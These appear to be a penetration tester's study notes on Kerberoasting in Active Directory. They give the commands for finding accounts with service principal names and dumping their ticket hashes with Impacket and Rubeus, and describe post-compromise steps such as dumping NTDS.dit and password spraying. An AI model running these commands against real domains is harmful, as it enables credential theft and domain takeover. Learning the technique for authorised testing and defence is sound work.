Kerberoasting
Kerberoasting allows a user to request a service ticket for any service with a registered SPN then use that ticket to crack the service password. If the service has a registered SPN then it can be Kerberoastable however the success of the attack depends on how strong the password is and if it is trackable as well as the privileges of the cracked service account. To enumerate Kerberoastable accounts tool like BloodHound to find all Kerberoastable accounts, it will allow you to see what kind of accounts you can kerberoast if they are domain admins, and what kind of connections they have to the rest of the domain.

If we are on the target and need to find all the spn accounts
    setspn -T offense -Q /

or some powerview cmdlets
    Get-NetUser -SPN

Or to get info about service account of specific group
    Get-NetUser -SPN | ?{$_.memberof -match 'GroupName'}
    Get-NetUser | Where-Object {$_.servicePrincipalName} | fl
    get-adobject | Where-Object {$.serviceprincipalname -ne $null -and $.distinguishedname -like "CN=Users" -and $_.cn -ne "krbtgt"}

    Using Impacket
This can be done remotely but for this we need a remote connection as any user on the target system
controller.local is domain name , Machine1 is PC name and Password1 is a password

    sudo python3 /usr/share/doc/python3-impacket/examples/GetUserSPNs.py controller.local/Machine1:Password1 -dc-ip 10.10.172.234 -request

    using Rubeus
This command will dump hashes of available service accounts
    Rubeus.exe kerberoast (we can also specify specific user to target by adding /username:password in this command.also domain or domaincontroller)

NOw copy the hash and crack in our machine

What Can a Service Account do?

After cracking the service account password there are various ways of exfiltrating data or collecting loot depending on whether the service account is a domain admin or not. If the service account is a domain admin you have control similar to that of a golden/silver ticket and can now gather loot such as dumping the NTDS.dit. If the service account is not a domain admin you can use it to log into other systems and pivot or escalate or you can use that cracked password to spray against other service and domain admin accounts; many companies may reuse the same or similar passwords for their service or domain admin users. If you are in a professional pen test be aware of how the company wants you to show risk most of the time they don't want you to exfiltrate data and will set a goal or process for you to get in order to show risk inside of the assessment.

Mitigations:
    Strong Complex passwords
    Dont make service accounts domain admins
